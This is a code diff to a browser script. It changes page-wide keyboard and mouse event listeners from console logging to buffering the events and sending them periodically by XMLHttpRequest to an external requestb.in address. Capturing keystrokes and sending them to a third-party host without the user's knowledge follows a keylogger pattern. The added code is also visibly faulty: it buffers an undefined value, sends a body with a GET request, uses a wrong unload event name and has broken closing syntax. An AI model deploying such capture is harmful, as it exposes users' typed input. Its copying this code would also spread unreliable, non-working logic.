@@ -1,45 +1,100 @@
 (function() {
-
-
     window.addEventListener("load", function(event) {
         console.log("load", event);
 
         var html = document.documentElement;
 
         html.addEventListener("keydown", function(event) {
-            console.log("keydown", event.key, event.target);
+          buffer_event("keydown", event);
         }, true);
 
         html.addEventListener("keypress", function(event) {
-            console.log("keypress", event.key, event.target);
+          buffer_event("keypress", event);
         }, true);
 
         html.addEventListener("keyup", function(event) {
-            console.log("keypup", event.key, event.target);
+          buffer_event("keyup", event);
         }, true);
 
         html.addEventListener("click", function(event) {
-            console.log("click", event.key, event.target);
+          buffer_event("click", event);
         }, true);
 
         html.addEventListener("mousemove", function(event) {
-            console.log("mouse move", event.key, event.target);
+          buffer_event("mouse move", event);
         }, true);
 
         html.addEventListener("mouseenter", function(event) {
-            console.log("mouse enter", event.key, event.target);
+          buffer_event("mouse enter", event);
         }, true);
 
         html.addEventListener("mouseleave", function(event) {
-            console.log("mouse leave", event.key, event.target);
+          buffer_event("mouse leave", event);
         }, true);
 
         html.addEventListener("mouseout", function(event) {
-            console.log("mouse out", event.key, event.target);
+          buffer_event("mouse out", event);
         }, true);
 
         html.addEventListener("mouseover", function(event) {
-            console.log("mouse over", event.key, event.target);
+          buffer_event("mouse over", event);
         }, true);
-    });
+
+
+        // Event logging
+        var eventSequence = 0;
+        var lastSent = 0;
+        var buffer = [];
+
+        function send_event (event_buffer) {
+          if (event_buffer.length == 0) {
+            console.log('Buffer was empty')
+            return false;
+          }
+
+          var out = [];
+
+          var httpRequest = new XMLHttpRequest();
+          httpRequest.onreadystatechange = function () {
+            console.log(httpRequest);
+          };
+          httpRequest.open('GET', 'http://requestb.in/p3iaskp3');
+          httpRequest.send(JSON.stringify(event_buffer));
+        }
+
+        // Save and clear the buffer
+        function send_buffer () {
+          tmp = buffer.slice();
+          buffer = [];
+
+          send_event(tmp);
+        }
+
+        // Send periodically
+        setInterval(function(){
+          console.log('Interval send');
+          send_buffer();
+        }, 5000);
+
+        window.addEventListener("onbeforeunload",function() {
+          lastSent = 0;
+          console.log('Leaving page');
+          send_buffer();
+        })
+
+        function buffer_event(name, e, target) {
+          eventSequence++;
+
+          buffer.push(target);
+
+          if (buffer.length > 50 || lastSent < e.timeStamp - 3000) {
+            // Update last sent
+            console.log(e);
+            lastSent = e.timeStamp
+
+            // Send the shit
+            send_buffer();
+          }
+        }
+    })()
 })();
